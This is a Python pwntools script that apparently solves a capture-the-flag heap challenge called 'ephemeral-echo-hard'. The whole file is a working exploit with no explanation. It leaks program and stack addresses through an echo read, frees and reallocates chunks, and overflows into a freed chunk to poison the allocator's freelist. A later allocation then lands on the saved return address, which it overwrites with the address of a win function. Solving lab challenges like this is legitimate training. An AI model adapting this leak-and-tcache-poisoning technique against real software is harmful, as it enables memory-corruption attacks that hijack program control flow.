from pwn import *

p = process("/challenge/ephemeral-echo-hard")

binary_addr_offset = b"48"
stack_addr_offset = b"56"

win_offset = 0x1400
saved_rip_offset = 374

print(p.clean())

p.sendline(b"malloc 0 32")

p.sendline(b"echo 0 " + binary_addr_offset)
x = p.clean()
binary_addr = int(''.join([x.split(b"Data: ")[1].split(b"\n")[0].hex()[i:i+2] for i in range(0, len(x.split(b"Data: ")[1].split(b"\n")[0].hex()), 2)][::-1]), 16)
base_addr = binary_addr - 0x2110
win_addr = base_addr + win_offset

print("[+] Leaked Base Address :: ", hex(base_addr))

p.sendline(b"echo 0 " + stack_addr_offset)
x = p.clean()
stack_addr = int(''.join([x.split(b"Data: ")[1].split(b"\n")[0].hex()[i:i+2] for i in range(0, len(x.split(b"Data: ")[1].split(b"\n")[0].hex()), 2)][::-1]), 16)
saved_rip_addr = stack_addr + saved_rip_offset

print("[+] Leaked Saved ROP :: ", hex(saved_rip_addr))

p.sendline(b"malloc 1 32")
p.sendline(b"malloc 2 32")
p.sendline(b"malloc 3 32")

print(p.clean())

p.sendline(b"free 3")
p.sendline(b"free 2")
p.sendline(b"free 1")

print(p.clean())

p.sendline(b"malloc 4 32")

p.sendline(b"read")
p.sendline(b"4")
p.sendline(b"56") # 32 + 8 + 8 + 8
p.sendline(b"A" * (32) + b"B" * 8 + b"C" * 8 + p64(saved_rip_addr))

print(p.clean())

p.sendline(b"malloc 5 32")
p.sendline(b"malloc 6 32")

print(p.clean())

p.sendline(b"read")
p.sendline(b"6")
p.sendline(b"8")
p.sendline(p64(win_addr))

print(p.clean())

p.sendline(b"quit")

print(p.clean())
